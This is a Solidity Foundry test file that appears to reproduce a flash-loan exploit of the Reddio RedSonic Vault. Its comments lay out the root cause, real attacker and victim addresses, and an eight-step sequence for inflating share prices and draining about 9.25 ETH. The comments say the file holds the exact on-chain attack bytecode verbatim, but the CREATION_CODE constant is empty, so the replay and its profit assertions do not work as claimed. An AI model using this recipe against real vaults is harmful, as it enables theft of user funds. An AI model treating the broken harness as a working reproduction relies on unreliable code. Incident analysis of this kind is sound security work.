pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// Reddio RedSonic Vault (RSV) — share-price inflation via a permissionless second-asset
// registration against a shared raw stETH balance — Ethereum. Attacker net gain ~9.25 ETH in a
// single flash-loan-funded contract-creation tx.
//
// Exploit tx   : 0xe3cba90e865c6cba950ebce36a52607f51f1fd33cd9fb920c78803f19b57791a (block 25912201)
// Attacker EOA : 0x70f2333d21Ed7E7D105F6578227A9A747687982C (tx.origin)
// Victim       : 0x4315990D9eeAFFdFAfD49958b4851F203FA1126f (RedSonic Vault, a Diamond/EIP-2535 proxy)
//
// The exploit tx is a CONTRACT-CREATION tx (to == null): the whole attack runs inside the created
// contract's constructor. The constructor deploys an inner helper (the Balancer flash-loan callback
// target), takes the flash loan, runs the sequence below, and sends the profit ETH back to the
// deployer (the create's msg.sender = the attacker EOA). There is no separate deploy tx.
//
// Protocol / market addresses read out of the exact creation bytecode:
//   RSV diamond   : 0x4315990D9eeAFFdFAfD49958b4851F203FA1126f (victim vault, EIP-2535 diamond)
//   stETH (Lido)  : 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84 (the asset the attacker registers)
//   WETH          : 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 (flash-loaned asset)
//   Balancer Vault: 0xBA12222222228d8Ba445958a75a0704d566BF2C8 (WETH flash-loan source)
//   Curve stETH/ETH: 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022 (swaps recovered stETH back to ETH)
//
// Root cause (verified against on-chain source of the vault's InvestmentManagerFacet
// 0x47F018dc00307cd48Fd71d489d92e550646598De and a live eth_call at block-1, NOT a key/signer
// compromise):
//
//   1. Share pricing has no per-share-class accounting of the stETH backing the ETH class.
//      getTotalAssetBalance(asset) sums each provider's getAssetBalance(provider, asset) plus
//      getRemainingBalance(asset), and getRemainingBalance for a non-native asset is simply
//      IERC20(asset).balanceOf(address(this)) — the vault's RAW token balance. The Lido provider
//      leg for the ETH class likewise reads the vault's raw stETH balance (lido.balanceOf(vault)).
//      There is no separate ledger tracking how much of that raw stETH belongs to the ETH class.
//
//   2. registerErc20(address) on the vault is PERMISSIONLESS. Confirmed at block-1 by a live
//      eth_call from a random non-owner (owner() is 0x3786540e..., a different address): the call
//      returns 0x with no revert, so any account can register a new tracked asset. The attacker
//      registers stETH itself as a second tracked asset (backing the rsvstETH share class).
//
//   Because a direct stETH deposit under the rsvstETH registration lands in the SAME raw stETH
//   balance that the ETH class's pricing already reads (lido.balanceOf(vault) / balanceOf(vault)),
//   one stETH balance backs both share classes at once. Depositing stETH inflates the rsvETH share
//   price without minting any rsvETH, so redeeming the previously-acquired rsvETH pays out at the
//   inflated rate.
//
// Confirmed flow, all in one tx (from the on-chain trace):
//   1. Flash-loan ~1,139 WETH from Balancer.
//   2. registerErc20(stETH) — permissionless; adds stETH as a second tracked asset.
//   3. depositEth ~1,130 ETH — acquire ~99% of the rsvETH supply.
//   4. deposit ~9.34 stETH under the stETH registration — inflates rsvETH's share price without
//      minting rsvETH (it lands in the same raw stETH balance the ETH class prices off).
//   5. redeem rsvETH at the inflated rate — nets ~1,139.5 ETH (~9.25 ETH over the 1,130 deposited).
//   6. redeem rsvstETH — recover the ~9.34 stETH deposited in step 4.
//   7. swap the recovered stETH to ETH on Curve.
//   8. repay the Balancer flash loan; send the leftover ETH to the attacker EOA.
//
// This PoC reproduces the real tx faithfully: it replays the EXACT on-chain creation bytecode of the
// exploit tx (hardcoded verbatim, no attack logic reconstructed), deploying it with the attacker EOA
// pranked as both msg.sender and tx.origin at the state of block-1. The created contract's own
// address differs from the on-chain one, but the bytecode is byte-identical and every victim/market
// address it touches is hardcoded, so the attack runs identically.
//
// Run:
//   forge test --contracts src/test/2026-09/Reddio_exp.sol -vvv

contract Reddio_exp is Test {
    address internal constant ATTACKER = 0x70f2333d21Ed7E7D105F6578227A9A747687982C;
    address internal constant RSV_DIAMOND = 0x4315990D9eeAFFdFAfD49958b4851F203FA1126f;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    // Exact input of the exploit tx 0xe3cba90e... (a create tx, so the input IS the creation
    // bytecode plus its appended constructor args), copied verbatim.
    bytes internal constant CREATION_CODE =
        hex"";

    function setUp() public {
        // block-1: real protocol state immediately before the exploit tx executed.
        vm.createSelectFork("mainnet", 25912200);
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        uint256 eoaBefore = ATTACKER.balance;
        emit log_named_decimal_uint("attacker ETH before", eoaBefore, 18);

        // Replay the real exploit tx: deploy the exact on-chain creation bytecode with the attacker
        // EOA as both msg.sender and tx.origin. The constructor runs the whole attack and sends the
        // profit ETH back to the create's msg.sender (the attacker EOA).
        vm.prank(ATTACKER, ATTACKER);
        bytes memory code = CREATION_CODE;
        address deployed;
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }
        require(deployed != address(0), "exploit replay failed");

        uint256 eoaGain = ATTACKER.balance - eoaBefore;
        emit log_named_decimal_uint("attacker ETH after", ATTACKER.balance, 18);
        emit log_named_decimal_uint("attacker net gain (ETH)", eoaGain, 18);

        // Net gain matches the reported ~9.25 ETH. On-chain the EOA also paid gas; in the harness gas
        // is not charged to the pranked EOA, so the full selfdestruct/transfer payout lands here.
        assertGe(eoaGain, 9 ether, "gain below expected ~9.25 ETH profit");
        assertApproxEqAbs(eoaGain, 9.25 ether, 0.3 ether, "gain off traced ~9.25 ETH");
    }
}
